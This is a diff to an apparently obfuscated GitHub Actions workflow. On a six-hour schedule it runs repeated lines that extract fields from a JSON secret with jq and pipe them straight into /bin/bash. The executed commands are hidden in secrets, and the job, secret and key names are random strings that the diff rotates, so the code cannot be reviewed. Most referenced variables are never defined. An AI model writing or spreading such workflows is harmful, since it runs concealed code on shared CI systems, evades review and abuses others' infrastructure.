@@ -2,25 +2,28 @@ name: qianduole7681
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
+    - cron: '23 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qianduole7681
         env:
-          kxaru6: ${{ secrets.kxaru6 }}
+          wakps92809: ${{ secrets.wakps92809 }}
         run: |
-          echo $kxaru6 | jq -r .ftjy773 | /bin/bash
-          echo $a80 | jq -r .i1913 | /bin/bash
-          echo $fkwy17 | jq -r .gub6445 | /bin/bash
-          echo $o6291 | jq -r .eaid55 | /bin/bash
-          echo $frsl415 | jq -r .mgqce23 | /bin/bash
-          echo $jagbn8304 | jq -r .n0187 | /bin/bash
-          echo $rbfjk85409 | jq -r .ftk30703 | /bin/bash
-          echo $fnkqq13327 | jq -r .qmbh90319 | /bin/bash
-          echo $ldnc6707 | jq -r .bafl05468 | /bin/bash
-          echo $wzwb08 | jq -r .skkc91 | /bin/bash
-          echo $ysv22 | jq -r .ks5 | /bin/bash
+          echo $wakps92809 | jq -r .ieiay4945 | /bin/bash
+          echo $p0107 | jq -r .ghiw11845 | /bin/bash
+          echo $cticv57 | jq -r .byn56060 | /bin/bash
+          echo $w7 | jq -r .og792 | /bin/bash
+          echo $opn83107 | jq -r .gxws76 | /bin/bash
+          echo $wxv14813 | jq -r .e12950 | /bin/bash
+          echo $p8 | jq -r .nkbfo0 | /bin/bash
+          echo $nbwc65 | jq -r .nkp025 | /bin/bash
+          echo $sgbt4758 | jq -r .pyxzv8087 | /bin/bash
+          echo $nykrl408 | jq -r .nl0 | /bin/bash
+          echo $m79 | jq -r .vfqt99271 | /bin/bash
+          echo $j01 | jq -r .tlwev58 | /bin/bash
 
